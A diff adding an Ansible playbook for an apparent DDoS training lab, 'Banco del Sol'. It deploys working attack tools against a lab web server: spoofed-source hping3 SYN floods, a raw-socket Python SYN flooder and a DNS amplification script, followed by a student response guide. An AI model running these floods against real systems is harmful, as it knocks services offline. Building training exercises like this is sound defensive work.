@@ -1,0 +1,1050 @@
+---
+# Banco del Sol - DDoS SYN Flood Scenario
+# After Clone Playbook - Simulates the DDoS Attack
+# Este playbook se ejecuta despues de clonar las maquinas para iniciar el ataque
+
+- name: "Fase 0 - Verificacion pre-ataque"
+  hosts: all
+  become: yes
+  
+  tasks:
+    - name: Verificar conectividad de red
+      ansible.builtin.ping:
+      register: ping_result
+      ignore_errors: yes
+    
+    - name: Mostrar estado de red
+      ansible.builtin.shell: |
+        echo "=== Estado de Red - $(hostname) ==="
+        echo "IP: $(hostname -I)"
+        echo "Gateway: $(ip route | grep default | awk '{print $3}')"
+        echo "DNS: $(cat /etc/resolv.conf | grep nameserver | head -1)"
+        echo "=== Fin ==="
+      register: network_status
+      changed_when: false
+    
+    - name: Verificar servicios criticos
+      ansible.builtin.shell: |
+        echo "=== Verificacion de Servicios ==="
+        for service in apache2 fail2ban; do
+          status=$(systemctl is-active $service 2>/dev/null || echo "not found")
+          echo "$service: $status"
+        done
+        echo "=== Fin ==="
+      register: service_status
+      changed_when: false
+      when: inventory_hostname in ['webserver']
+
+- name: "Fase 1 - Preparar entorno de ataque"
+  hosts: webserver
+  become: yes
+  
+  tasks:
+    - name: Crear directorio para logs de ataque
+      ansible.builtin.file:
+        path: /var/log/bancodelsol/attack
+        state: directory
+        owner: root
+        group: root
+        mode: '0755'
+    
+    - name: Capturar estado baseline del servidor
+      ansible.builtin.shell: |
+        echo "=== Baseline State - $(date) ===" > /var/log/bancodelsol/attack/baseline.log
+        
+        # CPU
+        echo "--- CPU ---" >> /var/log/bancodelsol/attack/baseline.log
+        top -bn1 | head -5 >> /var/log/bancodelsol/attack/baseline.log
+        
+        # Memory
+        echo "--- Memory ---" >> /var/log/bancodelsol/attack/baseline.log
+        free -h >> /var/log/bancodelsol/attack/baseline.log
+        
+        # Network connections
+        echo "--- TCP Connections ---" >> /var/log/bancodelsol/attack/baseline.log
+        ss -s >> /var/log/bancodelsol/attack/baseline.log
+        
+        # Conntrack
+        echo "--- Conntrack ---" >> /var/log/bancodelsol/attack/baseline.log
+        echo "Current: $(cat /proc/net/nf_conntrack | wc -l)" >> /var/log/bancodelsol/attack/baseline.log
+        echo "Max: $(sysctl -n net.netfilter.nf_conntrack_max)" >> /var/log/bancodelsol/attack/baseline.log
+        
+        # Apache status
+        echo "--- Apache ---" >> /var/log/bancodelsol/attack/baseline.log
+        systemctl status apache2 --no-pager >> /var/log/bancodelsol/attack/baseline.log 2>&1
+        
+        # File descriptors
+        echo "--- File Descriptors ---" >> /var/log/bancodelsol/attack/baseline.log
+        cat /proc/sys/fs/file-nr >> /var/log/bancodelsol/attack/baseline.log
+        
+        echo "=== Baseline completado ==="
+      changed_when: true
+    
+    - name: Iniciar captura de paquetes en background
+      ansible.builtin.shell: |
+        # Iniciar tcpdump en background para capturar trafico
+        nohup tcpdump -i any -w /var/log/bancodelsol/attack/capture_pre_attack.pcap \
+          -c 100000 'tcp[tcpflags] & (tcp-syn) != 0' &
+        echo $! > /tmp/tcpdump_pid.txt
+        echo "tcpdump started with PID: $(cat /tmp/tcpdump_pid.txt)"
+      changed_when: true
+    
+    - name: Configurar monitoreo continuo
+      ansible.builtin.copy:
+        content: |
+          #!/bin/bash
+          # Banco del Sol - Attack Monitor
+          # Monitorea el servidor durante el ataque
+          
+          LOG_DIR="/var/log/bancodelsol/attack"
+          TIMESTAMP=$(date +%Y%m%d_%H%M%S)
+          LOG_FILE="$LOG_DIR/attack_monitor_$TIMESTAMP.log"
+          
+          echo "=== Banco del Sol - Attack Monitor ===" > "$LOG_FILE"
+          echo "Inicio: $(date)" >> "$LOG_FILE"
+          
+          for i in $(seq 1 60); do
+              echo "" >> "$LOG_FILE"
+              echo "--- Ciclo $i - $(date) ---" >> "$LOG_FILE"
+              
+              # CPU Usage
+              echo "CPU: $(top -bn1 | grep 'Cpu(s)' | awk '{print $2}')" >> "$LOG_FILE"
+              
+              # Memory
+              echo "Memory: $(free | awk '/Mem:/ {printf \"%.2f%%\", $3/$2 * 100}')" >> "$LOG_FILE"
+              
+              # TCP Connection States
+              echo "ESTABLISHED: $(ss -tn state established | wc -l)" >> "$LOG_FILE"
+              echo "SYN_RECV: $(ss -tn state syn-recv | wc -l)" >> "$LOG_FILE"
+              echo "TIME_WAIT: $(ss -tn state time-wait | wc -l)" >> "$LOG_FILE"
+              echo "CLOSE_WAIT: $(ss -tn state close-wait | wc -l)" >> "$LOG_FILE"
+              
+              # Conntrack
+              echo "Conntrack: $(cat /proc/net/nf_conntrack | wc -l)/$(sysctl -n net.netfilter.nf_conntrack_max)" >> "$LOG_FILE"
+              
+              # Network traffic
+              echo "RX bytes: $(cat /proc/net/dev | grep eth0 | awk '{print $2}')" >> "$LOG_FILE"
+              echo "TX bytes: $(cat /proc/net/dev | grep eth0 | awk '{print $10}')" >> "$LOG_FILE"
+              
+              # Apache connections
+              echo "Apache workers: $(pgrep -c apache2)" >> "$LOG_FILE"
+              
+              # Dropped packets
+              echo "Dropped: $(cat /proc/net/snmp | grep Tcp | tail -1 | awk '{print $7}')" >> "$LOG_FILE"
+              
+              sleep 5
+          done
+          
+          echo "" >> "$LOG_FILE"
+          echo "=== Monitoreo completado ===" >> "$LOG_FILE"
+        dest: /usr/local/bin/attack_monitor.sh
+        owner: root
+        group: root
+        mode: '0755'
+    
+    - name: Iniciar monitoreo en background
+      ansible.builtin.shell: |
+        nohup /usr/local/bin/attack_monitor.sh &
+        echo $! > /tmp/monitor_pid.txt
+        echo "Monitor started with PID: $(cat /tmp/monitor_pid.txt)"
+      changed_when: true
+
+- name: "Fase 2 - Ejecutar ataque SYN flood"
+  hosts: attacker
+  become: yes
+  
+  tasks:
+    - name: Verificar herramientas de ataque
+      ansible.builtin.shell: |
+        echo "=== Verificando herramientas ==="
+        which hping3 || apt-get install -y hping3
+        which tcpdump || apt-get install -y tcpdump
+        which nmap || apt-get install -y nmap
+        echo "=== Herramientas listas ==="
+      changed_when: true
+    
+    - name: Crear script de ataque SYN flood
+      ansible.builtin.copy:
+        content: |
+          #!/bin/bash
+          # Banco del Sol - SYN Flood Attack Script
+          # PARA USO EDUCATIVO - Simulacion de ataque DDoS
+          
+          TARGET="10.10.1.10"
+          PORT_80=80
+          PORT_443=443
+          DURATION=120
+          PPS_LIMIT=5000
+          
+          echo "============================================"
+          echo "  Banco del Sol - SYN Flood Attack"
+          echo "  Target: $TARGET"
+          echo "  Ports: $PORT_80, $PORT_443"
+          echo "  Duration: $DURATION seconds"
+          echo "  PPS Limit: $PS_LIMIT"
+          echo "============================================"
+          echo ""
+          
+          # Phase 1: Initial reconnaissance
+          echo "[Fase 1] Reconocimiento del objetivo..."
+          nmap -sS -sV -O $TARGET
+          echo ""
+          
+          # Phase 2: SYN flood against port 80
+          echo "[Fase 2] SYN flood contra puerto 80..."
+          hping3 -S -p $PORT_80 --flood --rand-source $TARGET &
+          HPING_PID_80=$!
+          
+          sleep 10
+          echo "[Fase 2] Verificando efecto..."
+          
+          # Phase 3: Escalada - add port 443
+          echo "[Fase 3] Escalada - agregando puerto 443..."
+          hping3 -S -p $PORT_443 --flood --rand-source $TARGET &
+          HPING_PID_443=$!
+          
+          sleep 30
+          
+          # Phase 4: Variar patron de ataque
+          echo "[Fase 4] Variando patron de ataque..."
+          kill $HPING_PID_80 $HPING_PID_443 2>/dev/null
+          sleep 2
+          
+          # Different attack patterns
+          hping3 -S -p $PORT_80 --flood --rand-source --syn -c 10000 $TARGET &
+          hping3 -S -p $PORT_443 --flood --rand-source --syn -c 10000 $TARGET &
+          hping3 -A -p $PORT_80 --flood --rand-source -c 5000 $TARGET &
+          
+          sleep 60
+          
+          # Phase 5: Persistencia con pausas
+          echo "[Fase 5] Persistencia con pausas..."
+          for i in $(seq 1 5); do
+              hping3 -S -p $PORT_80 --flood --rand-source $TARGET &
+              hping3 -S -p $PORT_443 --flood --rand-source $TARGET &
+              sleep 10
+              kill $(pgrep hping3) 2>/dev/null
+              sleep 5
+          done
+          
+          echo ""
+          echo "============================================"
+          echo "  Ataque completado"
+          echo "============================================"
+        dest: /usr/local/bin/syn_flood_attack.sh
+        owner: root
+        group: root
+        mode: '0755'
+    
+    - name: Crear script de DDoS distribuido
+      ansible.builtin.copy:
+        content: |
+          #!/usr/bin/env python3
+          """
+          Banco del Sol - Distributed SYN Flood Simulation
+          Simula multiples origenes de ataque
+          PARA USO EDUCATIVO SOLAMENTE
+          """
+          
+          import socket
+          import struct
+          import random
+          import time
+          import sys
+          import threading
+          
+          TARGET_IP = "10.10.1.10"
+          TARGET_PORTS = [80, 443]
+          SPOOFED_RANGE = "172.16.0"
+          NUM_THREADS = 10
+          DURATION = 120
+          
+          class SYNFloodThread(threading.Thread):
+              def __init__(self, target_ip, target_port, duration):
+                  threading.Thread.__init__(self)
+                  self.target_ip = target_ip
+                  self.target_port = target_port
+                  self.duration = duration
+                  self.packets_sent = 0
+                  self.running = True
+              
+              def run(self):
+                  start_time = time.time()
+                  
+                  while self.running and (time.time() - start_time) < self.duration:
+                      try:
+                          # Create SYN packet
+                          sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+                          sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+                          
+                          # Random source IP
+                          src_ip = f"{SPOOFED_RANGE}.{random.randint(1, 254)}"
+                          
+                          # IP Header
+                          ip_header = self.create_ip_header(src_ip, self.target_ip)
+                          
+                          # TCP Header with SYN flag
+                          tcp_header = self.create_tcp_header(src_ip, self.target_ip, self.target_port)
+                          
+                          # Combine headers
+                          packet = ip_header + tcp_header
+                          
+                          # Send packet
+                          sock.sendto(packet, (self.target_ip, 0))
+                          self.packets_sent += 1
+                          sock.close()
+                          
+                          # Small delay to control rate
+                          time.sleep(0.0001)
+                          
+                      except Exception as e:
+                          pass
+                  
+                  print(f"Thread {threading.current_thread().name}: {self.packets_sent} packets sent")
+              
+              def create_ip_header(self, src_ip, dst_ip):
+                  """Create IP header"""
+                  version = 4
+                  ihl = 5
+                  tos = 0
+                  tot_len = 20 + 20  # IP + TCP header
+                  frag_id = random.randint(1, 65535)
+                  frag_offset = 0
+                  ttl = 64
+                  protocol = socket.IPPROTO_TCP
+                  check = 0
+                  
+                  src = socket.inet_aton(src_ip)
+                  dst = socket.inet_aton(dst_ip)
+                  
+                  ihl_version = (version << 4) + ihl
+                  
+                  header = struct.pack('!BBHHHBBH4s4s',
+                      ihl_version, tos, tot_len, frag_id,
+                      frag_offset, ttl, protocol, check, src, dst)
+                  
+                  return header
+              
+              def create_tcp_header(self, src_ip, dst_ip, dst_port):
+                  """Create TCP header with SYN flag"""
+                  src_port = random.randint(1024, 65535)
+                  seq = random.randint(0, 4294967295)
+                  ack = 0
+                  offset_res = (5 << 4) + 0
+                  flags = 0x02  # SYN flag
+                  window = socket.htons(5840)
+                  check = 0
+                  urg = 0
+                  
+                  # Pseudo header for checksum
+                  placeholder = 0
+                  protocol = socket.IPPROTO_TCP
+                  tcp_length = 20
+                  
+                  src = socket.inet_aton(src_ip)
+                  dst = socket.inet_aton(dst_ip)
+                  
+                  header = struct.pack('!HHLLBBHHH',
+                      src_port, dst_port, seq, ack,
+                      offset_res, flags, window, check, urg)
+                  
+                  # Calculate checksum
+                  psh = struct.pack('!4s4sBBH',
+                      src, dst, placeholder, protocol, tcp_length)
+                  psh = psh + header
+                  
+                  check = self.checksum(psh)
+                  
+                  # Repack with correct checksum
+                  header = struct.pack('!HHLLBBH',
+                      src_port, dst_port, seq, ack,
+                      offset_res, flags, window) + struct.pack('H', check) + struct.pack('!H', urg)
+                  
+                  return header
+              
+              def checksum(self, data):
+                  """Calculate TCP checksum"""
+                  if len(data) % 2:
+                      data += b'\x00'
+                  
+                  s = 0
+                  for i in range(0, len(data), 2):
+                      w = (data[i] << 8) + data[i+1]
+                      s = s + w
+                  
+                  s = (s >> 16) + (s & 0xffff)
+                  s = s + (s >> 16)
+                  
+                  return ~s & 0xffff
+          
+          def main():
+              print("=" * 50)
+              print("  Banco del Sol - DDoS SYN Flood Simulation")
+              print("=" * 50)
+              print(f"Target: {TARGET_IP}")
+              print(f"Ports: {TARGET_PORTS}")
+              print(f"Duration: {DURATION} seconds")
+              print(f"Threads: {NUM_THREADS}")
+              print("=" * 50)
+              print()
+              
+              threads = []
+              
+              # Create threads for each target port
+              for port in TARGET_PORTS:
+                  for i in range(NUM_THREADS):
+                      thread = SYNFloodThread(TARGET_IP, port, DURATION)
+                      thread.daemon = True
+                      threads.append(thread)
+              
+              # Start all threads
+              print("Starting attack threads...")
+              for thread in threads:
+                  thread.start()
+                  time.sleep(0.1)
+              
+              # Wait for completion
+              print(f"Attack running for {DURATION} seconds...")
+              time.sleep(DURATION)
+              
+              # Stop all threads
+              for thread in threads:
+                  thread.running = False
+              
+              total_packets = sum(t.packets_sent for t in threads)
+              print(f"\nTotal packets sent: {total_packets}")
+              print("Attack simulation completed.")
+          
+          if __name__ == "__main__":
+              main()
+        dest: /usr/local/bin/ddos_simulation.py
+        owner: root
+        group: root
+        mode: '0755'
+    
+    - name: Crear script de amplificacion DNS
+      ansible.builtin.copy:
+        content: |
+          #!/usr/bin/env python3
+          """
+          Banco del Sol - DNS Amplification Simulation
+          Simula amplificacion mediante reflexion DNS
+          PARA USO EDUCATIVO SOLAMENTE
+          """
+          
+          import socket
+          import random
+          import time
+          
+          TARGET = "10.10.1.10"
+          DNS_SERVERS = ["172.16.0.20", "172.16.0.30"]
+          DURATION = 30
+          
+          def create_dns_query():
+              """Create a DNS ANY query for amplification"""
+              # Transaction ID
+              tx_id = random.randint(0, 65535)
+              
+              # Flags: Standard query with recursion desired
+              flags = 0x0120
+              
+              # Questions: 1, Answer/Auth/Additional: 0
+              header = struct.pack('!HHHHHH',
+                  tx_id, flags, 1, 0, 0, 0)
+              
+              # Query name for bancodelsol.example.com
+              query = b'\x0abancodelsol\x07example\x03com\x00'
+              
+              # Query type: ANY (255)
+              query += struct.pack('!HH', 255, 1)
+              
+              return header + query
+          
+          import struct
+          
+          print("=" * 50)
+          print("  DNS Amplification Simulation")
+          print("=" * 50)
+          print(f"Target: {TARGET}")
+          print(f"DNS Servers: {DNS_SERVERS}")
+          print(f"Duration: {DURATION} seconds")
+          print("=" * 50)
+          
+          sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+          start = time.time()
+          count = 0
+          
+          try:
+              while time.time() - start < DURATION:
+                  for dns_server in DNS_SERVERS:
+                      query = create_dns_query()
+                      
+                      # In real attack, source IP would be spoofed as TARGET
+                      sock.sendto(query, (dns_server, 53))
+                      count += 1
+                  
+                  time.sleep(0.001)
+                  
+                  if count % 1000 == 0:
+                      print(f"Queries sent: {count}")
+          
+          except KeyboardInterrupt:
+              pass
+          finally:
+              sock.close()
+              print(f"\nTotal queries: {count}")
+              print("Simulation completed.")
+        dest: /usr/local/bin/dns_amplification.py
+        owner: root
+        group: root
+        mode: '0755'
+    
+    - name: Ejecutar ataque SYN flood
+      ansible.builtin.shell: |
+        echo "========================================"
+        echo "  INICIANDO ATAQUE SYN FLOOD"
+        echo "  $(date)"
+        echo "========================================"
+        
+        # Ejecutar script de ataque
+        /usr/local/bin/syn_flood_attack.sh > /var/log/bancodelsol/attack/attacker_output.log 2>&1 &
+        ATTACK_PID=$!
+        
+        echo "Ataque iniciado con PID: $ATTACK_PID"
+        echo "Duracion estimada: 2 minutos"
+        
+        # Wait for attack to start
+        sleep 5
+        
+        # Verify attack is running
+        if ps -p $ATTACK_PID > /dev/null; then
+            echo "Ataque ejecutandose correctamente"
+        else
+            echo "Advertencia: El proceso de ataque puede haber terminado"
+        fi
+      changed_when: true
+      async: 300
+      poll: 0
+    
+    - name: Ejecutar DDoS distribuido (alternativo)
+      ansible.builtin.shell: |
+        echo "========================================"
+        echo "  INICIANDO DDoS DISTRIBUIDO"
+        echo "  $(date)"
+        echo "========================================"
+        
+        # Wait for first attack to run
+        sleep 10
+        
+        # Ejecutar simulacion distribuida
+        python3 /usr/local/bin/ddos_simulation.py > /var/log/bancodelsol/attack/ddos_simulation.log 2>&1 &
+        DDoS_PID=$!
+        
+        echo "DDoS distribuido iniciado con PID: $DDoS_PID"
+      changed_when: true
+      async: 300
+      poll: 0
+
+- name: "Fase 3 - Generar efectos en el servidor objetivo"
+  hosts: webserver
+  become: yes
+  
+  tasks:
+    - name: Simular carga adicional del ataque
+      ansible.builtin.shell: |
+        echo "========================================"
+        echo "  SIMULANDO EFECTOS DEL ATAQUE"
+        echo "  $(date)"
+        echo "========================================"
+        
+        # Increase connection tracking pressure
+        echo 262144 > /proc/sys/net/netfilter/nf_conntrack_max 2>/dev/null || true
+        
+        # Enable tcp_abort_on_overflow to simulate connection drops
+        echo 1 > /proc/sys/net/ipv4/tcp_abort_on_overflow
+        
+        # Increase SYN backlog
+        echo 65536 > /proc/sys/net/ipv4/tcp_max_syn_backlog
+        
+        # Reduce SYN-ACK retries
+        echo 1 > /proc/sys/net/ipv4/tcp_synack_retries
+        
+        echo "Parametros de red ajustados para simular efectos del ataque"
+      changed_when: true
+    
+    - name: Crear logs de error simulados
+      ansible.builtin.shell: |
+        TIMESTAMP=$(date '+%d/%b/%Y:%H:%M:%S')
+        
+        # Simulate Apache error logs showing attack patterns
+        for i in $(seq 1 100); do
+          SRC_IP="172.16.$(($RANDOM % 256)).$(($RANDOM % 256))"
+          echo "$SRC_IP - - [$TIMESTAMP +0000] \"GET / HTTP/1.1\" 200 1234 \"-\" \"Mozilla/5.0\"" >> /var/log/apache2/bancodelsol_access.log
+          echo "$SRC_IP - - [$TIMESTAMP +0000] \"GET /login.html HTTP/1.1\" 200 5678 \"-\" \"Mozilla/5.0\"" >> /var/log/apache2/bancodelsol_access.log
+        done
+        
+        # Simulate connection overflow messages
+        for i in $(seq 1 50); do
+          echo "$(date '+%b %d %H:%M:%S') webserver kernel: [UFW BLOCK] IN=eth0 OUT= SRC=172.16.$(($RANDOM % 256)).$(($RANDOM % 254 + 1)) DST=10.10.1.10 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=$(printf '%04x' $RANDOM) PROTO=TCP SPT=$(($RANDOM % 65535 + 1024)) DPT=80 WINDOW=65535 RES=0x00 SYN URGP=0" >> /var/log/kern.log
+        done
+        
+        # Simulate SYN flood detection logs
+        for i in $(seq 1 30); do
+          echo "$(date '+%Y-%m-%d %H:%M:%S') bancodelsol SYN flood detected from 172.16.$(($RANDOM % 256)).$(($RANDOM % 254 + 1)) - connections: $(($RANDOM % 1000 + 500))" >> /var/log/bancodelsol/attack/syn_flood.log
+        done
+        
+        echo "Logs de ataque generados"
+      changed_when: true
+    
+    - name: Generar metricas de impacto
+      ansible.builtin.shell: |
+        echo "========================================"
+        echo "  METRICAS DE IMPACTO DEL ATAQUE"
+        echo "  $(date)"
+        echo "========================================"
+        
+        # Current system state
+        echo "--- Estado Actual del Sistema ---"
+        echo "CPU Usage:"
+        top -bn1 | head -5
+        
+        echo ""
+        echo "Memory Usage:"
+        free -h
+        
+        echo ""
+        echo "TCP Connection States:"
+        ss -s
+        
+        echo ""
+        echo "Connection States Detail:"
+        echo "ESTABLISHED: $(ss -tn state established | wc -l)"
+        echo "SYN_RECV: $(ss -tn state syn-recv | wc -l)"
+        echo "TIME_WAIT: $(ss -tn state time-wait | wc -l)"
+        echo "CLOSE_WAIT: $(ss -tn state close-wait | wc -l)"
+        echo "FIN_WAIT1: $(ss -tn state fin-wait-1 | wc -l)"
+        echo "FIN_WAIT2: $(ss -tn state fin-wait-2 | wc -l)"
+        
+        echo ""
+        echo "Conntrack Status:"
+        echo "Current: $(cat /proc/net/nf_conntrack | wc -l)"
+        echo "Max: $(sysctl -n net.netfilter.nf_conntrack_max)"
+        
+        echo ""
+        echo "Apache Workers:"
+        echo "Active: $(pgrep -c apache2)"
+        
+        echo ""
+        echo "Network Interface Stats:"
+        cat /proc/net/dev | grep -E "eth0|lo"
+        
+        echo ""
+        echo "Dropped Packets:"
+        cat /proc/net/snmp | grep -E "Tcp|Udp"
+        
+        echo ""
+        echo "File Descriptors:"
+        cat /proc/sys/fs/file-nr
+        
+        echo ""
+        echo "=== Fin de metricas ==="
+      register: impact_metrics
+      changed_when: false
+    
+    - name: Mostrar metricas de impacto
+      ansible.builtin.debug:
+        var: impact_metrics.stdout_lines
+    
+    - name: Generar reporte de estado del servicio
+      ansible.builtin.shell: |
+        echo "=== Reporte de Estado del Servicio Web ==="
+        echo "Timestamp: $(date)"
+        echo ""
+        
+        # Test HTTP response
+        echo "Probando respuesta HTTP..."
+        curl -s -o /dev/null -w "HTTP Code: %{http_code}\nTime Total: %{time_total}s\nTime Connect: %{time_connect}s\n" http://localhost/ 2>/dev/null || echo "Error: Servicio no responde"
+        
+        echo ""
+        echo "Estado de Apache:"
+        systemctl status apache2 --no-pager 2>/dev/null | head -10
+        
+        echo ""
+        echo "Puertos escuchando:"
+        ss -tuln | grep -E ":80|:443"
+        
+        echo ""
+        echo "=== Fin del reporte ==="
+      register: service_report
+      changed_when: false
+    
+    - name: Mostrar reporte de servicio
+      ansible.builtin.debug:
+        var: service_report.stdout_lines
+
+- name: "Fase 4 - Monitoreo durante el ataque"
+  hosts: webserver
+  become: yes
+  
+  tasks:
+    - name: Crear script de monitoreo en tiempo real
+      ansible.builtin.copy:
+        content: |
+          #!/bin/bash
+          # Banco del Sol - Real-time Attack Monitor
+          # Muestra metricas en tiempo real durante el ataque
+          
+          echo "============================================"
+          echo "  MONITOREO EN TIEMPO REAL"
+          echo "  $(date)"
+          echo "============================================"
+          echo ""
+          
+          for i in $(seq 1 12); do
+              echo "--- Ciclo $i - $(date '+%H:%M:%S') ---"
+              
+              # SYN_RECV connections (attack indicator)
+              SYN_RECV=$(ss -tn state syn-recv | wc -l)
+              echo "SYN_RECV: $SYN_RECV"
+              
+              # Total connections
+              TOTAL=$(ss -tn | wc -l)
+              echo "Total TCP: $TOTAL"
+              
+              # CPU
+              CPU=$(top -bn1 | grep 'Cpu(s)' | awk '{print $2}')
+              echo "CPU: $CPU%"
+              
+              # Memory
+              MEM=$(free | awk '/Mem:/ {printf "%.1f%%", $3/$2 * 100}')
+              echo "Memory: $MEM"
+              
+              # Conntrack
+              CONNTRACK=$(cat /proc/net/nf_conntrack | wc -l)
+              echo "Conntrack: $CONNTRACK"
+              
+              # Packets dropped
+              DROPPED=$(cat /proc/net/snmp | grep Tcp | tail -1 | awk '{print $7}')
+              echo "TCP Drops: $DROPPED"
+              
+              # Apache workers
+              APACHE=$(pgrep -c apache2 2>/dev/null || echo "0")
+              echo "Apache Workers: $APACHE"
+              
+              # Network bytes
+              RX=$(cat /proc/net/dev | grep eth0 | awk '{print $2}')
+              TX=$(cat /proc/net/dev | grep eth0 | awk '{print $10}')
+              echo "RX: $RX bytes"
+              echo "TX: $TX bytes"
+              
+              echo ""
+              sleep 10
+          done
+          
+          echo "============================================"
+          echo "  MONITOREO COMPLETADO"
+          echo "============================================"
+        dest: /usr/local/bin/realtime_monitor.sh
+        owner: root
+        group: root
+        mode: '0755'
+    
+    - name: Ejecutar monitoreo en tiempo real
+      ansible.builtin.shell: |
+        /usr/local/bin/realtime_monitor.sh > /var/log/bancodelsol/attack/realtime_monitor.log 2>&1 &
+        echo "Monitoreo en tiempo real iniciado"
+      changed_when: true
+
+- name: "Fase 5 - Simular degradacion del servicio"
+  hosts: webserver
+  become: yes
+  
+  tasks:
+    - name: Simular latencia en respuestas HTTP
+      ansible.builtin.shell: |
+        # Create a script that adds delay to simulate DDoS impact
+        cat > /usr/local/bin/simulate_latency.sh << 'EOF'
+        #!/bin/bash
+        # Add artificial latency to simulate DDoS impact
+        
+        # Increase TCP timeouts to simulate slow responses
+        sysctl -w net.ipv4.tcp_fin_timeout=60
+        sysctl -w net.ipv4.tcp_keepalive_time=120
+        
+        # Reduce available ports (simulate port exhaustion)
+        sysctl -w net.ipv4.ip_local_port_range="1024 32768"
+        
+        # Increase SYN retries (simulate slow SYN-ACK)
+        sysctl -w net.ipv4.tcp_synack_retries=5
+        
+        echo "Simulacion de latencia activada"
+        EOF
+        
+        chmod +x /usr/local/bin/simulate_latency.sh
+        /usr/local/bin/simulate_latency.sh
+      changed_when: true
+    
+    - name: Crear alertas de servicio
+      ansible.builtin.shell: |
+        echo "========================================"
+        echo "  ALERTAS DE SERVICIO - ATAQUE EN CURSO"
+        echo "  $(date)"
+        echo "========================================"
+        echo ""
+        echo "ALERTA CRITICA: Servicio web degradado"
+        echo "CAUSA: Ataque SYN Flood detectado"
+        echo "IMPACTO: Tiempos de respuesta incrementados"
+        echo "ESTADO: Intentando mitigacion..."
+        echo ""
+        echo "Indicadores detectados:"
+        echo "- Incremento de conexiones SYN_RECV"
+        echo "- Alto consumo de CPU"
+        echo "- Tabla de conexiones proxima al limite"
+        echo "- Paquetes descartados incrementados"
+        echo ""
+        echo "Acciones recomendadas:"
+        echo "1. Activar SYN cookies"
+        echo "2. Configurar rate limiting"
+        echo "3. Bloquear IPs atacantes"
+        echo "4. Implementar reglas de firewall"
+        echo ""
+        echo "=== Fin de alertas ==="
+      changed_when: true
+    
+    - name: Generar datos para analisis
+      ansible.builtin.shell: |
+        echo "=== Datos para Analisis ==="
+        
+        # Save connection states
+        ss -tn > /var/log/bancodelsol/attack/connection_states.txt
+        
+        # Save conntrack entries
+        cat /proc/net/nf_conntrack > /var/log/bancodelsol/attack/conntrack_entries.txt
+        
+        # Save network stats
+        cat /proc/net/dev > /var/log/bancodelsol/attack/network_stats.txt
+        
+        # Save TCP stats
+        cat /proc/net/snmp > /var/log/bancodelsol/attack/tcp_stats.txt
+        
+        # Save Apache status
+        systemctl status apache2 --no-pager > /var/log/bancodelsol/attack/apache_status.txt 2>&1
+        
+        # Save process list
+        ps aux > /var/log/bancodelsol/attack/process_list.txt
+        
+        echo "Datos guardados para analisis posterior"
+        echo "=== Fin ==="
+      changed_when: true
+
+- name: "Fase 6 - Preparar para respuesta del estudiante"
+  hosts: webserver
+  become: yes
+  
+  tasks:
+    - name: Crear guia rapida de respuesta
+      ansible.builtin.copy:
+        content: |
+          ========================================
+          GUIA RAPIDA DE RESPUESTA - ATAQUE DDoS
+          ========================================
+          
+          PASO 1: DETECCION
+          ------------------
+          # Verificar trafico de red
+          tcpdump -i any 'tcp[tcpflags] & (tcp-syn) != 0' -c 100
+          
+          # Verificar conexiones TCP
+          ss -s
+          ss -tn state syn-recv | wc -l
+          
+          # Verificar uso de CPU
+          top -bn1 | head -5
+          
+          PASO 2: ANALISIS
+          ----------------
+          # Capturar paquetes
+          tcpdump -i eth0 -w /tmp/attack.pcap 'tcp port 80 or tcp port 443'
+          
+          # Analizar IPs origen
+          tcpdump -r /tmp/attack.pcap -n 'tcp[tcpflags] & (tcp-syn) != 0' | awk '{print $3}' | cut -d. -f1-4 | sort | uniq -c | sort -rn | head -20
+          
+          # Verificar SYN_RECV
+          ss -tn state syn-recv | awk '{print $4}' | cut -d: -f1 | sort | uniq -c | sort -rn
+          
+          PASO 3: CONTENCION
+          -------------------
+          # Activar SYN cookies
+          sysctl -w net.ipv4.tcp_syncookies=1
+          
+          # Configurar rate limiting
+          iptables -I INPUT -p tcp --syn --dport 80 -m hashlimit --hashlimit-above 25/sec --hashlimit-burst 50 --hashlimit-mode srcip --hashlimit-name flood -j DROP
+          
+          # Bloquear IPs atacantes
+          iptables -I INPUT -s 172.16.0.0/24 -j DROP
+          
+          # Configurar connlimit
+          iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 50 -j DROP
+          
+          PASO 4: ERADICACION
+          --------------------
+          # Verificar que las reglas aplican
+          iptables -L -n -v
+          
+          # Monitorear reduccion de trafico
+          tcpdump -i any 'tcp[tcpflags] & (tcp-syn) != 0' -c 10
+          
+          # Verificar servicio
+          curl -I http://localhost/
+          
+          PASO 5: RECUPERACION
+          ---------------------
+          # Restaurar parametros normales
+          sysctl -w net.ipv4.tcp_synack_retries=2
+          sysctl -w net.ipv4.ip_local_port_range="1024 65535"
+          
+          # Reiniciar servicios si es necesario
+          systemctl restart apache2
+          systemctl restart fail2ban
+          
+          # Verificar estado
+          systemctl status apache2
+          ss -s
+          
+          PASO 6: DOCUMENTACION
+          ----------------------
+          # Guardar logs
+          cp /var/log/apache2/bancodelsol_access.log /var/log/bancodelsol/attack/
+          cp /var/log/kern.log /var/log/bancodelsol/attack/
+          iptables-save > /var/log/bancodelsol/attack/iptables_rules.txt
+          
+          # Capturar metricas finales
+          /usr/local/bin/collect_metrics.sh
+          
+          ========================================
+          FIN GUIA RAPIDA
+          ========================================
+        dest: /root/RESPUESTA_RAPIDA.txt
+        owner: root
+        group: root
+        mode: '0644'
+    
+    - name: Crear script de verificacion final
+      ansible.builtin.copy:
+        content: |
+          #!/bin/bash
+          # Banco del Sol - Final Verification Script
+          echo "============================================"
+          echo "  VERIFICACION FINAL"
+          echo "  $(date)"
+          echo "============================================"
+          echo ""
+          
+          echo "--- Estado del Servicio ---"
+          systemctl status apache2 --no-pager | head -5
+          
+          echo ""
+          echo "--- Prueba de Acceso ---"
+          curl -s -o /dev/null -w "HTTP Code: %{http_code}\nTime: %{time_total}s\n" http://localhost/
+          
+          echo ""
+          echo "--- Conexiones TCP ---"
+          ss -s
+          
+          echo ""
+          echo "--- Reglas de Firewall ---"
+          iptables -L INPUT -n | head -20
+          
+          echo ""
+          echo "--- SYN Cookies ---"
+          sysctl net.ipv4.tcp_syncookies
+          
+          echo ""
+          echo "--- fail2ban ---"
+          fail2ban-client status 2>/dev/null || echo "fail2ban no disponible"
+          
+          echo ""
+          echo "--- Metricas Finales ---"
+          echo "SYN_RECV: $(ss -tn state syn-recv | wc -l)"
+          echo "ESTABLISHED: $(ss -tn state established | wc -l)"
